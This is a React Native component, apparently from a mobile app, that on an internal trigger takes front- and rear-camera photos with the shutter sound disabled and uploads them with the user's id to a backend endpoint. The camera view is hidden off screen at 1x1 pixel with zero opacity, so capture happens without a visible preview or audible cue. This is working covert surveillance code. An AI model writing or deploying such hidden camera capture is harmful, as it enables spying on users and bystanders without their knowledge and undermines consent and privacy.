import React, { useEffect, useRef, useState } from 'react';
import { View, DeviceEventEmitter, StyleSheet } from 'react-native';
import { CameraView, useCameraPermissions } from 'expo-camera';
import { useAuthStore } from '../store/useAuthStore';
import { api } from '../services/api';

export const TRIGGER_VISION_SNAP = 'TRIGGER_VISION_SNAP';

export const AutonomousEyes: React.FC = () => {
  const [permission, requestPermission] = useCameraPermissions();
  const cameraRef = useRef<CameraView>(null);
  const [facing, setFacing] = useState<'front' | 'back'>('front');
  const isCapturingRef = useRef(false);
  const pendingPhotosRef = useRef<{ front?: string, back?: string }>({});
  
  const user = useAuthStore((s) => s.user);

  useEffect(() => {
    // Request permission silently on mount if not already granted
    if (!permission?.granted) {
      requestPermission();
    }
  }, [permission]);

  useEffect(() => {
    const subscription = DeviceEventEmitter.addListener(TRIGGER_VISION_SNAP, async () => {
      if (isCapturingRef.current || !cameraRef.current || !user || !permission?.granted) {
        console.log('[AutonomousEyes] Cannot snap. Not ready, already capturing, or missing permissions.');
        return;
      }

      isCapturingRef.current = true;
      pendingPhotosRef.current = {};

      try {
        console.log('[AutonomousEyes] Preparing front capture...');
        setFacing('front');
        // Give camera hardware time to initialize
        await new Promise(r => setTimeout(r, 800));
        
        const frontPhoto = await cameraRef.current.takePictureAsync({
          quality: 0.3,
          base64: true,
          shutterSound: false,
        });
        if (frontPhoto?.base64) pendingPhotosRef.current.front = frontPhoto.base64;

        console.log('[AutonomousEyes] Switching to rear camera...');
        setFacing('back');
        // Give camera hardware time to flip lens
        await new Promise(r => setTimeout(r, 1200));

        const rearPhoto = await cameraRef.current.takePictureAsync({
          quality: 0.3,
          base64: true,
          shutterSound: false,
        });
        if (rearPhoto?.base64) pendingPhotosRef.current.back = rearPhoto.base64;

        // Reset for next time
        setFacing('front');

        if (pendingPhotosRef.current.front || pendingPhotosRef.current.back) {
          console.log('[AutonomousEyes] Dual-snap captured. Uploading to vision endpoint...');
          
          const payload = {
            user_id: user.id,
            front_image_base64: pendingPhotosRef.current.front,
            rear_image_base64: pendingPhotosRef.current.back,
            mime_type: 'image/jpeg',
          };

          // Upload to backend using configured axios instance
          api.post('/api/vision/snap', payload)
            .then(() => console.log('[AutonomousEyes] Dual-snap uploaded successfully'))
            .catch((err) => console.error('[AutonomousEyes] Failed to upload dual-snap:', err));
        }
      } catch (err) {
        console.error('[AutonomousEyes] Failed to complete dual capture:', err);
        setFacing('front'); // ensure we reset
      } finally {
        isCapturingRef.current = false;
      }
    });

    return () => {
      subscription.remove();
    };
  }, [user, permission]);

  if (!permission?.granted) {
    return null; // Don't render anything if no permission
  }

  return (
    <View style={styles.hiddenContainer} pointerEvents="none">
      <CameraView
        ref={cameraRef}
        style={styles.camera}
        facing={facing}
      />
    </View>
  );
};

const styles = StyleSheet.create({
  hiddenContainer: {
    position: 'absolute',
    top: -100, // Move completely off screen
    left: -100,
    width: 1,
    height: 1,
    opacity: 0,
    overflow: 'hidden',
  },
  camera: {
    flex: 1,
  },
});
